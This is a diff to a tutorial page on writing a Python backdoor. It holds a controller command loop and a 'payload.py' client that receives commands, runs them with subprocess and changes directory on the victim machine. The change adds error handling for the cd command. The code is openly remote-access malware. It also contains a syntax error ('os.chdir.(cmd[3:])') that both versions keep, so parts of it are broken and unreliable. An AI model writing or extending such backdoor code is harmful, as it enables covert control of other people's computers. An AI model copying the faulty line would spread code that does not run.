@@ -1,4 +1,4 @@
-<h2 align="center">Change Directory using Backdoor</h2>
+<h2 align="center">Handle Change Directory (cd) exceptions</h2>
 <p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>
 
 - - - - - - - - - - - - - - - - - - - - - -
@@ -33,9 +33,10 @@ while True:
 		connection.close()
 		break
 
-	# Change Directory (cd)
-	elif cmd[:2] == "cd": # Check initial part (cd) slice using string [:index]
+	elif cmd[:2] == "cd":
 		connection.send(bytes(cmd, "utf-8"))
+		recv = recv_data() # bytes
+		print(recv.decode("utf-8"))
 		continue
 		
 	connection.send(bytes(cmd, "utf-8"))
@@ -48,6 +49,7 @@ print("Server has stopped")
 ---
 > [payload.py](payload.py)
 ```python
+
 import socket
 import subprocess
 
@@ -74,10 +76,14 @@ while True:
 		payload.close()
 		break
 	
-	# Change Directory (cd)
-	elif cmd[:2] == "cd": # Check initial part (cd) slice using string [:index]
-		# use os module and chdir function (change directory)
-		os.chdir.(cmd[3:]) # give the command the 2nd argument after (cd)
+	elif cmd[:2] == "cd":
+		# Handle Change Directory (cd) Exception
+		try:
+			os.chdir.(cmd[3:])
+		except FileNotFoundError:
+			send_data(b"File not found")
+		else:
+			send_data(b"Changed directory")
 		continue
 
 	try:
